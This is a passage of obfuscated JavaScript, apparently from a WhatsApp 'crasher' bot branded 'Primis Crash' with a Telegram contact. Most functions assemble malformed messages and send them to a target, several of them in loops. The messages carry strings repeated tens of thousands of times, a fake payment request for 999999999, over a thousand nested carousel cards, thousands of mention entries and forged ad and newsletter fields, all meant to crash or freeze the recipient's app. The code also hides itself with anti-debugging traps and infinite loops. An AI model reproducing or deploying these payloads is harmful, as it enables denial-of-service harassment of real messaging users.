                        break;
                      case 248:
                      case -189:
                      case 147:
                        [そしねめ.ぬかたもた.ねにかてあ, そしねめ.ぬかたもた.ええまになし] = [179, -223];
                        そしねめ.とはは = そしねめ.ぬかたもた;
                        めはぬこ += 65;
                        ちせそ += -378;
                        break;
                      default:
                        [そしねめ.ぬかたもた.ねにかてあ, そしねめ.ぬかたもた.ええまになし] = [-27, -126];
                        そしねめ.とはは = そしねめ.こもし;
                        めはぬこ += -232;
                        ちせそ += 496;
                        break;
                    }
                  }
                }
              };
              かたまさ.のむししそね = undefined;
              めはぬこ + -956;
              かたまさ.はえさえみふ = かたまさ.むにな(-(ゆえつみおか + 686), めはぬこ + -808).next().value;
              if (かたまさ.のむししそね) {
                そしねめ.ますとたさ = そしねめ.かたまさ;
                ちせそ += -122;
                break;
              } else {
                そしねめ.ますとたさ = そしねめ.かたまさ;
                ゆえつみおか += 499;
                めはぬこ += -662;
                ちせそ += 200;
                break;
              }
            default:
              [そしねめ.のこい.もほくひのに, そしねめ.のこい.なくけすや, そしねめ.のこい.けえみし] = [-135, 137, 136];
              のこい.そよにしむむ = function (...ゆえつみおか) {
                return くめうめみか(-635, 957, -161, {
                  のこい: そしねめ.のこい,
                  かたまさ: {}
                }, ゆえつみおか).next().value;
              };
              if ("LVOESxI" in すかく) {
                そしねめ.ますとたさ = そしねめ.のこい;
                ゆえつみおか += -101;
                めはぬこ += -9;
                ちせそ += 541;
                break;
              } else {
                そしねめ.ますとたさ = そしねめ.のこい;
                ゆえつみおか += -541;
                めはぬこ += -9;
                ちせそ += 541;
                break;
              }
            case そしねめ.のこい.もほくひのに + 174:
            case 127:
            case 197:
              return はえさえみふ;
              そしねめ.ますとたさ = そしねめ.かたまさ;
              ゆえつみおか += 499;
              めはぬこ += -662;
              ちせそ += 322;
              break;
            case 60:
            case ちせそ + 39:
            case 68:
              そしねめ.ますとたさ = そしねめ.むにきてひし;
              ゆえつみおか += -432;
              めはぬこ += 127;
              ちせそ += 9;
              break;
            case -114:
              そしねめ.ますとたさ = そしねめ.てねむ;
              ゆえつみおか += -77;
              めはぬこ += 127;
              ちせそ += -149;
              break;
            case めはぬこ - 97:
              return undefined;
            case ちせそ - 359:
              [そしねめ.のこい.もほくひのに, そしねめ.のこい.なくけすや, そしねめ.のこい.けえみし] = [99, -149, 232];
              return undefined;
          }
        }
      }
    }
    var うぬせ;
    var ゆえつみおか = くめうめみか(-94, 177, -319).next().value;
    if (うぬせ) {
      return ゆえつみおか;
    }
  }
  if (くめうめみか()) {
    while (すたきや[4]) {}
    むほえ = すたきや[23];
  }
})();
async function まうぬへ([くめうめみか], うぬせ) {
  debugger;
  let ゆえつみおか = new Date();
  let {
    [すたきや[45]]: すかく
  } = await うぬせ[すたきや[40]][すたきや[41] + すたきや[42]](くめうめみか, {
    [すたきや[43]]: "wait.."
  });
  let めはぬこ = new Date() - ゆえつみおか;
  var ちせそ = "*Pong*:\n> ⏱️" + すたきや[39] + めはぬこ + "ms (" + Math.round(めはぬこ / すたきや[17]) / すたきや[795] + "s)";
  await うぬせ[すたきや[800]](すたきや[243]);
  await うぬせ[すたきや[40]][すたきや[41] + すたきや[42]](くめうめみか, {
    [すたきや[43]]: ちせそ,
    edit: すかく
  });
}
async function ほふはも([くめうめみか], うぬせ) {
  await うぬせ[すたきや[554]][すたきや[49] + すたきや[46]](くめうめみか, {
    [すたきや[134] + すたきや[135] + すたきや[136] + すたきや[88] + すたきや[44]]: {
      [すたきや[104] + すたきや[44]]: {
        [すたきや[137] + すたきや[138] + すたきや[103]]: {
          [すたきや[45]]: {
            [すたきや[50] + すたきや[51]]: すたきや[182] + "550002" + すたきや[80] + すたきや[81] + すたきや[82],
            [すたきや[83] + すたきや[84]]: すたきや[85] + すたきや[86] + すたきや[87],
            [すたきや[47]]: generateMessageTag()
          },
          [すたきや[139]]: "STATUS_MENTION_MESSAGE"
        }
      }
    }
  }, {});
  console[すたきや[440]]("[34m[INFO][0m Channel bugs have been sent to:", くめうめみか);
}
async function めつにた([くめうめみか, うぬせ = すたきや[2]], ゆえつみおか) {
  (function () {
    var くめうめみか = function () {
      const うぬせ = function () {
        const うぬせ = new RegExp(すたきや[75]);
        return うぬせ[すたきや[76]](くめうめみか);
      };
      if (うぬせ()) {
        while (すたきや[4]) {}
      }
    };
    return くめうめみか();
  })();
  const すかく = {
    [すたきや[52] + すたきや[53] + すたきや[46]]: {
      [すたきや[54] + すたきや[55]]: "𑐶𑐵𑆷𑐷𑆵"[すたきや[56]](39998),
      [すたきや[57] + すたきや[47]]: すたきや[58] + すたきや[59] + すたきや[60] + すたきや[61] + すたきや[62],
      [すたきや[48] + すたきや[63]]: すたきや[64] + すたきや[65] + すたきや[66],
      [すたきや[48] + すたきや[67] + すたきや[68]]: すたきや[69],
      [すたきや[70] + すたきや[71]]: "🧪⃟꙰⌁ ҈🩸⃟⃨〫⃰‣ ⁖��⃟༑⌁⃰𝐏𝐫𝐢͢𝐦𝐢�� 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉 ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ",
      [すたきや[72] + すたきや[73]]: すたきや[37]
    }
  };
  await ゆえつみおか[すたきや[553]][すたきや[49] + すたきや[46]](くめうめみか, すかく, うぬせ ? {
    [すたきや[50] + すたきや[51]]: {
      [すたきや[74]]: くめうめみか
    }
  } : {});
}
async function まうはけひう([くめうめみか, うぬせ = すたきや[2]], ゆえつみおか) {
  const すかく = {
    [すたきや[52] + すたきや[53] + すたきや[46]]: {
      [すたきや[54] + すたきや[55]]: "ཹ"[すたきや[56]](130000),
      [すたきや[57] + すたきや[47]]: すたきや[58] + すたきや[59] + すたきや[60] + すたきや[61] + すたきや[62],
      [すたきや[48] + すたきや[63]]: すたきや[64] + すたきや[65] + すたきや[66],
      [すたきや[48] + すたきや[67] + すたきや[68]]: すたきや[69],
      [すたきや[70] + すたきや[71]]: "🧪⃟꙰⌁ ҈🩸⃟⃨〫⃰‣ ⁖🎭⃟༑⌁⃰��𝐫𝐢͢𝐦𝐢𝐬 𝑪͢𝒓𝒂ͯ͢��𝒉ཀ͜͡🐉 ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ",
      [すたきや[72] + すたきや[73]]: すたきや[37]
    }
  };
  await ゆえつみおか[すたきや[552]][すたきや[49] + すたきや[46]](くめうめみか, すかく, うぬせ ? {
    [すたきや[50] + すたきや[51]]: {
      [すたきや[74]]: くめうめみか
    }
  } : {});
}
async function へあは([くめうめみか, うぬせ = すたきや[2]], ゆえつみおか) {
  (function () {
    var くめうめみか = function () {
      const うぬせ = function () {
        const うぬせ = new RegExp(すたきや[75]);
        return うぬせ[すたきや[76]](くめうめみか);
      };
      if (うぬせ()) {
        while (すたきや[4]) {}
      }
    };
    return くめうめみか();
  })();
  const すかく = {
    [すたきや[108] + すたきや[93] + すたきや[46]]: {
      [すたきや[98]]: すたきや[245] + すたきや[246] + すたきや[247] + "�𝒉ཀ͜͡🐉⃜" + すたきや[264][すたきや[56]](50000),
      [すたきや[89] + すたきや[102] + すたきや[42]]: {
        [すたきや[78] + すたきや[77]]: [{
          [すたきや[90]]: "review_and_pay",
          [すたきや[78] + すたきや[297] + すたきや[91]]: "{\"currency\":\"XOF\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":999999999,\"offset\":100},\"reference_id\":\"PRIMIS CRASHED\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"descripiton\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-69d62566-4850-469a-b192-a6fd9f58cc14\",\"name\":null,\"amount\":{\"value\":999999999,\"offset\":100},\"quantity\":1}]},\"additional_note\":null,\"native_payment_methods\":[],\"share_payment_status\":false" + すたきや[391]
        }]
      },
      [すたきや[148] + すたきや[149]]: {
        [すたきや[130] + すたきや[179]]: Array[すたきや[217]]({
          [すたきや[79]]: すたきや[218]
        }, () => {
          (function () {
            var くめうめみか = function () {
              const うぬせ = function () {
                const うぬせ = new RegExp(すたきや[75]);
                return うぬせ[すたきや[76]](くめうめみか);
              };
              if (うぬせ()) {
                while (すたきや[4]) {}
              }
            };
            return くめうめみか();
          })();
          return すたきや[266] + Math[すたきや[260]](Math[すたきや[261]]() * すたきや[287]) + (すたきや[80] + すたきや[81] + すたきや[82]);
        }),
        [すたきや[83] + すたきや[84]]: すたきや[85] + すたきや[86] + すたきや[87],
        [すたきや[50] + すたきや[51]]: すたきや[265] + すたきや[180] + すたきや[181],
        [すたきや[226]]: すたきや[4],
        [すたきや[231] + すたきや[232]]: すたきや[4],
        [すたきや[233] + すたきや[234] + すたきや[235]]: すたきや[380],
        [すたきや[184] + すたきや[88] + すたきや[44]]: {
          [すたきや[227] + すたきや[228] + すたきや[229]]: {
            [すたきや[92]]: {
              [すたきや[43]]: すたきや[277] + すたきや[278] + すたきや[279] + すたきや[280] + すたきや[281],
              [すたきや[150]]: すたきや[151] + すたきや[152]
            },
            [すたきや[89] + すたきや[153] + すたきや[154] + すたきや[88] + すたきや[44]]: {
              [すたきや[90]]: すたきや[155] + すたきや[156] + すたきや[147],
              [すたきや[157] + すたきや[91]]: すたきや[158][すたきや[56]](すたきや[296]),
              [すたきや[159] + すたきや[71]]: すたきや[19]
            }
          }
        }
      }
    }
  };
  await ゆえつみおか[すたきや[551]][すたきや[41] + すたきや[42]](くめうめみか, すかく, うぬせ ? {
    [すたきや[50] + すたきや[51]]: {
      [すたきや[74]]: くめうめみか
    }
  } : {});
}
async function ててむすね([うぬせ, ゆえつみおか = すたきや[4]], すかく) {
  (function () {
    var うぬせ = function () {
      const ゆえつみおか = function () {
        const ゆえつみおか = new RegExp(すたきや[75]);
        return ゆえつみおか[すたきや[76]](うぬせ);
      };
      if (ゆえつみおか()) {
        while (すたきや[4]) {}
      }
    };
    return うぬせ();
  })();
  let めはぬこ = [];
  for (let ちせそ = すたきや[0]; ちせそ < 1055; ちせそ++) {
    めはぬこ[すたきや[387]]({
      [すたきや[92]]: すかく[すたきや[94]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[109]][すたきや[96] + すたきや[97]]({
        [すたきや[43]]: " \0 "
      }),
      [すたきや[110]]: すかく[すたきや[94]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[111]][すたきや[96] + すたきや[97]]({
        [すたきや[43]]: "  "
      }),
      [すたきや[113]]: すかく[すたきや[94]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[114]][すたきや[96] + すたきや[97]]({
        [すたきや[98]]: すたきや[39],
        [すたきや[115] + すたきや[116] + すたきや[117]]: すたきや[4],
        [すたきや[389] + すたきや[46]]: {
          [すたきや[122]]: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=tru" + すたきや[44],
          [すたきや[329] + すたきや[211]]: すたきや[375] + すたきや[376],
          [すたきや[332] + すたきや[333]]: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
          [すたきや[330] + すたきや[331]]: "18352",
          [すたきや[379]]: すたきや[212],
          [すたきや[381]]: 1280,
          [すたきや[100] + すたきや[225]]: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
          [すたきや[334] + すたきや[335] + すたきや[336]]: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
          [すたきや[337] + すたきや[338]]: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e" + すたきや[99],
          [すたきや[100] + すたきや[342] + すたきや[343]]: "1737281900",
          [すたきや[120] + すたきや[121] + すたきや[101]]: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIiQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
          [すたきや[382] + すたきや[383]]: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
          [すたきや[385] + すたきや[386]]: くめうめみか([10557, 1905, 2353, 3537], 11),
          ["midQualityFile" + すたきや[344]]: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo="
        }
      }),
      [すたきや[89] + すたきや[102] + すたきや[42]]: すかく[すたきや[94]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[390] + すたきや[102] + すたきや[42]][すたきや[96] + すたきや[97]]({
        [すたきや[78] + すたきや[77]]: []
      })
    });
  }
  let そしねめ = await すかく[すたきや[125]](うぬせ, {
    [すたきや[126] + すたきや[127] + すたきや[103]]: {
      [すたきや[104] + すたきや[44]]: {
        [すたきや[104] + すたきや[270] + すたきや[271]]: {
          [すたきや[105] + すたきや[106] + すたきや[107]]: {},
          [すたきや[105] + すたきや[106] + すたきや[107] + すたきや[392] + すたきや[71]]: すたきや[12]
        },
        [すたきや[108] + すたきや[93] + すたきや[46]]: すかく[すたきや[94]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[96] + すたきや[97]]({
          [すたきや[92]]: すかく[すたきや[94]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[109]][すたきや[112]]({
            [すたきや[43]]: すたきや[39]
          }),
          [すたきや[110]]: すかく[すたきや[94]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[111]][すたきや[112]]({
            [すたきや[43]]: "Dsprimis¿?"
          }),
          [すたきや[113]]: すかく[すたきや[94]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[114]][すたきや[112]]({
            [すたきや[115] + すたきや[116] + すたきや[117]]: すたきや[2]
          }),
          [すたきや[393] + すたきや[118] + すたきや[103]]: すかく[すたきや[94]][すたきや[88] + すたきや[44]][すたきや[95] + すたきや[93] + すたきや[46]][すたきや[394] + すたきや[118] + すたきや[103]][すたきや[96] + すたきや[97]]({
            [すたきや[395]]: [...めはぬこ]
          })
        })
      }
    }
  }, {});
  let ぬめくほき = {
    [すたきや[119] + すたきや[162] + すたきや[163]]: -すたきや[164],
    [すたきや[119] + すたきや[165] + すたきや[166]]: すたきや[167],
    [すたきや[120] + すたきや[121] + すたきや[101]]: すたきや[37],
    [すたきや[90]]: " Telegram: @dsprimis " + (すたきや[123] + すたきや[124])[すたきや[56]](15000),
    [すたきや[168] + すたきや[77]]: すたきや[144] + すたきや[145] + すたきや[146] + すたきや[77] + "𖣂"[すたきや[56]](すたきや[177]),
    [すたきや[122]]: すたきや[169] + "//craz" + "y.appl" + すたきや[797] + (すたきや[123] + すたきや[124])[すたきや[56]](すたきや[170]) + すたきや[171]
  };
  let むほえ = すかく[すたきや[125]](うぬせ, {
    [すたきや[126] + すたきや[127] + すたきや[103]]: {
      [すたきや[104] + すたきや[44]]: {
        [すたきや[160] + すたきや[161] + すたきや[103]]: ぬめくほき
      }
    }
  }, {});
  for (const まうぬへ of [そしねめ, むほえ]) {
    await すかく[すたきや[133]][すたきや[49] + すたきや[46]](すたきや[85] + すたきや[86] + すたきや[87], まうぬへ[すたきや[104] + すたきや[44]], {
      [すたきや[104] + すたきや[172]]: まうぬへ[すたきや[45]][すたきや[47]],
      [すたきや[85] + すたきや[173] + すたきや[128]]: [うぬせ],
      [すたきや[140] + すたきや[141] + すたきや[142]]: [{
        [すたきや[129]]: すたきや[143],
        [すたきや[131]]: {},
        [すたきや[132] + すたきや[128]]: [{
          [すたきや[129]]: すたきや[130] + すたきや[174] + すたきや[175],
          [すたきや[131]]: {},
          [すたきや[132] + すたきや[128]]: [{
            [すたきや[129]]: すたきや[176],
            [すたきや[131]]: {
              [すたきや[74]]: うぬせ
            },
            [すたきや[132] + すたきや[128]]: すたきや[23]
          }]
        }]
      }]
    });
    if (ゆえつみおか) {
      await すかく[すたきや[133]][すたきや[49] + すたきや[46]](うぬせ, {
        [すたきや[134] + すたきや[135] + すたきや[136] + すたきや[88] + すたきや[44]]: {
          [すたきや[104] + すたきや[44]]: {
            [すたきや[137] + すたきや[138] + すたきや[103]]: {
              [すたきや[45]]: まうぬへ[すたきや[45]],
              [すたきや[139]]: すたきや[268]
            }
          }
        }
      }, {
        [すたきや[140] + すたきや[141] + すたきや[142]]: [{
          [すたきや[129]]: すたきや[143],
          [すたきや[131]]: {
            [すたきや[353] + すたきや[354] + すたきや[355]]: すたきや[144] + すたきや[145] + すたきや[146] + すたきや[77]
          }
        }]
      });
    }
  }
}
async function うよむに([くめうめみか, うぬせ], ゆえつみおか) {
  (function () {
    var くめうめみか = function () {
      const うぬせ = function () {
        const うぬせ = new RegExp(すたきや[75]);
        return うぬせ[すたきや[76]](くめうめみか);
      };
      if (うぬせ()) {
        while (すたきや[4]) {}
      }
    };
    return くめうめみか();
  })();
  const すかく = await ゆえつみおか[すたきや[550]](うぬせ, {
    [すたきや[108] + すたきや[254] + すたきや[255] + すたきや[185] + すたきや[147]]: {
      [すたきや[148] + すたきや[149]]: {},
      [すたきや[92]]: {
        [すたきや[43]]: " # ! Ds Primis ! ",
        [すたきや[150]]: すたきや[151] + すたきや[152]
      },
      [すたきや[89] + すたきや[153] + すたきや[154] + すたきや[88] + すたきや[44]]: {
        [すたきや[90]]: すたきや[155] + すたきや[156] + すたきや[147],
        [すたきや[157] + すたきや[91]]: すたきや[273] + すたきや[274] + すたきや[275] + すたきや[158][すたきや[56]](すたきや[248]) + (すたきや[373] + すたきや[374] + "ion\":\"3\"}"),
        [すたきや[159] + すたきや[71]]: すたきや[19]
      }
    }
  }, {});
  await くめうめみか[すたきや[49] + すたきや[46]](うぬせ, {
    [すたきや[134] + すたきや[135] + すたきや[46] + すたきや[213]]: {
      [すたきや[104] + すたきや[44]]: すかく[すたきや[104] + すたきや[44]]
    }
  }, {
    [すたきや[50] + すたきや[51]]: {
      [すたきや[74]]: うぬせ
    }
  });
}
async function ゆさね([くめうめみか], うぬせ) {
  const ゆえつみおか = (すたきや[123] + "𑆿𑆿")[すたきや[56]](26000);
  let すかく = うぬせ[すたきや[549]](target, {
    [すたきや[126] + すたきや[127] + すたきや[103]]: {
      [すたきや[104] + すたきや[44]]: {
        [すたきや[160] + すたきや[161] + すたきや[103]]: {
          [すたきや[119] + すたきや[162] + すたきや[163]]: -すたきや[164],
          [すたきや[119] + すたきや[165] + すたきや[166]]: すたきや[167],
          [すたきや[120] + すたきや[121] + すたきや[101]]: thumbnailX,
          [すたきや[90]]: "🩸⃟༑⌁⃰𝐏𝐫𝐢͢𝐦𝐢�� 𝐂𝐫ͯ͢𝐚𝐬𝐡 ཀ͜͡" + すたきや[326] + ゆえつみおか,
          [すたきや[168] + すたきや[77]]: "༑ Fail Beta - ( Primis ) \"👋\"" + ゆえつみおか,
          [すたきや[122]]: すたきや[169] + "//Prim" + "is." + (すたきや[123] + すたきや[124])[すたきや[56]](すたきや[170]) + すたきや[171] + (すたきや[123] + すたきや[124])
        }
      }
    }
  }, {});
  await うぬせ[すたきや[548]][すたきや[49] + すたきや[46]](すたきや[85] + すたきや[86] + すたきや[87], すかく[すたきや[104] + すたきや[44]], {
    [すたきや[104] + すたきや[172]]: すかく[すたきや[45]][すたきや[47]],
    [すたきや[85] + すたきや[173] + すたきや[128]]: [target],
    [すたきや[140] + すたきや[141] + すたきや[142]]: [{
      [すたきや[129]]: すたきや[143],
      [すたきや[131]]: {},
      [すたきや[132] + すたきや[128]]: [{
        [すたきや[129]]: すたきや[130] + すたきや[174] + すたきや[175],
        [すたきや[131]]: {},
        [すたきや[132] + すたきや[128]]: [{
          [すたきや[129]]: すたきや[176],
          [すたきや[131]]: {
            [すたきや[74]]: target
          },
          [すたきや[132] + すたきや[128]]: すたきや[23]
        }]
      }]
    }]
  });
}
async function えゆそい([くめうめみか], うぬせ) {
  const すかく = うぬせ[すたきや[547]](くめうめみか, {
    [すたきや[262] + すたきや[263] + すたきや[88] + すたきや[44]]: {
      [すたきや[43]]: "‼️"[すたきや[56]](すたきや[177]) + "💤"[すたきや[56]](すたきや[177]) + (すたきや[123] + すたきや[124])[すたきや[56]](すたきや[188]) + (すたきや[178] + "҉⃝҉⃝҉⃝҉⃝҉" + すたきや[178] + "҉")[すたきや[56]](すたきや[177]),
      [すたきや[148] + すたきや[149]]: {
        [すたきや[130] + すたきや[179]]: [くめうめみか, "support@s.wh" + すたきや[180] + すたきや[181], すたきや[182] + すたきや[205] + すたきや[202] + すたきや[203] + すたきや[204]],
        [すたきや[339] + すたきや[294]]: すたきや[183],
        [すたきや[50] + すたきや[51]]: くめうめみか,
        [すたきや[184] + すたきや[88] + すたきや[44]]: {
          [すたきや[288] + すたきや[289] + すたきや[185] + すたきや[147]]: {
            [すたきや[290] + すたきや[291]]: すたきや[19],
            [すたきや[251] + すたきや[252] + すたきや[253]]: ゆえつみおか(すたきや[186], すたきや[187], すたきや[187])
          }
        },
        [すたきや[190] + すたきや[191] + すたきや[192]]: {
          [すたきや[193] + すたきや[194]]: すたきや[195] + すたきや[196] + すたきや[197],
          [すたきや[198] + すたきや[199]]: すたきや[200] + すたきや[201]
        }
      },
      [すたきや[48] + すたきや[284] + すたきや[285] + すたきや[286]]: すたきや[151] + すたきや[152]
    }
  }, {});
  await うぬせ[すたきや[546]][すたきや[49] + すたきや[46]](くめうめみか, すかく[すたきや[104] + すたきや[44]], {
    [すたきや[104] + すたきや[172]]: すかく[すたきや[45]][すたきや[47]],
    [すたきや[50] + すたきや[51]]: {
      [すたきや[74]]: くめうめみか
    }
  });
}
async function なぬけせ([くめうめみか], うぬせ) {
  const ゆえつみおか = (すたきや[123] + すたきや[124])[すたきや[56]](すたきや[216]);
  const すかく = (すたきや[123] + すたきや[124])[すたきや[56]](すたきや[188]);
  const めはぬこ = すたきや[169] + "//prim" + "is.xyz" + すたきや[189] + ゆえつみおか + すたきや[189] + ゆえつみおか + すたきや[189] + ゆえつみおか + すたきや[189] + ゆえつみおか;
  await うぬせ[すたきや[545]][すたきや[49] + すたきや[46]](くめうめみか, {
    [すたきや[250] + "tPhone" + "Number" + すたきや[88] + すたきや[44]]: {
      [すたきや[148] + すたきや[149]]: {
        [すたきや[184] + すたきや[88] + すたきや[44]]: {
          [すたきや[160] + すたきや[161] + すたきや[103]]: {
            [すたきや[119] + すたきや[162] + すたきや[163]]: すたきや[214],
            [すたきや[119] + すたきや[165] + すたきや[166]]: -すたきや[215],
            [すたきや[90]]: "💤‼️⃟⃰⃟꙰。⌁🎭⃟༑⌁⃰𝐏𝐫𝐢͢𝐦𝐢𝐬 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + ゆえつみおか,
            [すたきや[206] + すたきや[207]]: めはぬこ,
            [すたきや[122]]: めはぬこ
          }
        },
        [すたきや[190] + すたきや[191] + すたきや[192]]: {
          [すたきや[193] + すたきや[194]]: すたきや[195] + すたきや[196] + すたきや[197],
          [すたきや[198] + すたきや[199]]: すたきや[200] + すたきや[201]
        },
        [すたきや[130] + すたきや[179]]: [くめうめみか, すたきや[182] + "50001@" + すたきや[202] + すたきや[203] + すたきや[204], すたきや[182] + すたきや[205] + すたきや[202] + すたきや[203] + すたきや[204]],
        [すたきや[219] + すたきや[220] + すたきや[221]]: {
          [すたきや[98]]: "💤‼️⃟⃰⃟꙰。⌁🎭⃟༑⌁⃰𝐏𝐫��͢𝐦𝐢�� 𝑪͢𝒓𝒂ͯ͢𝒔�" + すたきや[272],
          [すたきや[92]]: すかく + すかく + すかく,
          [すたきや[223] + すたきや[224]]: "VIDEO",
          [すたきや[454] + すたきや[455] + すたきや[456] + すたきや[73]]: すたきや[4],
          [すたきや[452] + すたきや[453]]: めはぬこ,
          mediaUrl: めはぬこ,
          [すたきや[206] + すたきや[207]]: めはぬこ,
          ["containsAuto" + すたきや[462]]: すたきや[4],
          ["showAd" + すたきや[244] + "ution"]: すたきや[4],
          ["ctwaCl" + すたきや[47]]: "ctwa_clid_ex" + すたきや[208],
          ref: "ref_ex" + すたきや[208]
        },
        [すたきや[236] + すたきや[237] + すたきや[238] + すたきや[239]]: {
          [すたきや[210] + すたきや[240] + すたきや[209]]: "1234567890@newsletter",
          [すたきや[242] + すたきや[88] + すたきや[172]]: すたきや[1],
          [すたきや[210] + すたきや[241] + すたきや[222]]: すかく,
          [すたきや[132] + "tType"]: "UPDATE"
        }
      },
      ["skipTy" + すたきや[211]]: 7
    }
  }, {
    [すたきや[50] + すたきや[51]]: {
      [すたきや[74]]: くめうめみか
    }
  });
}
async function きふたよさ([くめうめみか], うぬせ) {
  debugger;
  const ゆえつみおか = うぬせ[すたきや[543]][すたきや[472] + すたきや[473]]("./MOTUPATLU.jpg");
  for (let すかく = すたきや[0]; すかく < すたきや[212]; すかく++) {
    await うぬせ[すたきや[544]][すたきや[49] + すたきや[46]](くめうめみか, {
      [すたきや[134] + すたきや[135] + すたきや[46] + すたきや[213]]: {
        [すたきや[104] + すたきや[44]]: {
          [すたきや[160] + すたきや[161] + すたきや[103]]: {
            [すたきや[119] + すたきや[162] + すたきや[163]]: すたきや[214],
            [すたきや[119] + すたきや[165] + すたきや[166]]: -すたきや[215],
            [すたきや[90]]: "🧪⃟꙰。🎭⃟༑⌁⃰ＭＯＴＵ PATLUཀ͜͡🐉" + (すたきや[123] + すたきや[124])[すたきや[56]](すたきや[216]),
            [すたきや[122]]: すたきや[169] + "//t.me" + "/dspri" + すたきや[818],
            [すたきや[148] + すたきや[149]]: {
              [すたきや[130] + すたきや[179]]: Array[すたきや[217]]({
                [すたきや[79]]: すたきや[218]
              }, (くめうめみか, うぬせ) => {
                return すたきや[230] + (うぬせ + すたきや[1]) + (すたきや[80] + すたきや[81] + すたきや[82]);
              }),
              [すたきや[219] + すたきや[220] + すたきや[221]]: {
                [すたきや[184] + "Ad"]: {
                  ["advertiserNa" + すたきや[222]]: (すたきや[123] + すたきや[124])[すたきや[56]](すたきや[216]),
                  [すたきや[223] + すたきや[224]]: "IMAGE",
                  [すたきや[120] + すたきや[121] + すたきや[101]]: ゆえつみおか,
                  [すたきや[70] + すたきや[71]]: (すたきや[123] + すたきや[124])[すたきや[56]](すたきや[216])
                },
                ["placeholderK" + すたきや[225]]: {
                  [すたきや[83] + すたきや[84]]: "0s.wha" + すたきや[81] + すたきや[82],
                  [すたきや[226]]: すたきや[2],
                  [すたきや[47]]: "ABCDEF" + すたきや[340] + "7890"
                }
              }
            }
          }
        }
      }
    }, {
      [すたきや[50] + すたきや[51]]: {
        [すたきや[74]]: くめうめみか
      }
    });
  }
}
async function ふてく([くめうめみか, うぬせ = すたきや[4]], ゆえつみおか) {
  debugger;
  for (let すかく = すたきや[0]; すかく < すたきや[430]; すかく++) {
    let めはぬこ = {
      [すたきや[227] + すたきや[228] + すたきや[229]]: {
        [すたきや[148] + すたきや[149]]: {
          [すたきや[130] + すたきや[179]]: Array[すたきや[217]]({
            [すたきや[79]]: すたきや[218]
          }, (くめうめみか, うぬせ) => {
            return すたきや[230] + (うぬせ + 72) + (すたきや[80] + すたきや[81] + すたきや[82]);
          }),
          [すたきや[231] + すたきや[232]]: すたきや[4],
          [すたきや[233] + すたきや[234] + すたきや[235]]: 7205,
          [すたきや[236] + すたきや[237] + すたきや[238] + すたきや[239]]: {
            [すたきや[210] + すたきや[240] + すたきや[209]]: "1203720525028@newslette" + すたきや[199],
            [すたきや[210] + すたきや[241] + すたきや[222]]: すたきや[256] + " Crash" + "er Ch",
            [すたきや[242] + すたきや[88] + すたきや[172]]: すたきや[243],
            [すたきや[327] + すたきや[328] + すたきや[321]]: "🎭⃟༑⌁⃰��𝐫𝐢͢��𝐢𝐬 ��͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉˒"
          },
          [すたきや[85] + すたきや[244] + "utionT" + すたきや[224]]: "RESHARED_FROM_MENTION",
          contactVcard: すたきや[4],
          isSampled: すたきや[4],
          ["dissap" + すたきや[191] + すたきや[192]]: {
            [すたきや[193] + すたきや[194]]: くめうめみか,
            [すたきや[193] + "tedByM" + すたきや[44]]: すたきや[4]
          },
          [すたきや[498] + すたきや[68]]: Date[すたきや[292]]()
        },
        [すたきや[92]]: {
          [すたきや[43]]: すたきや[245] + すたきや[246] + すたきや[247] + "�𝒉ཀ͜͡🐉",
          [すたきや[150]]: すたきや[151] + すたきや[152]
        },
        [すたきや[257] + すたきや[258] + すたきや[259] + すたきや[44]]: {
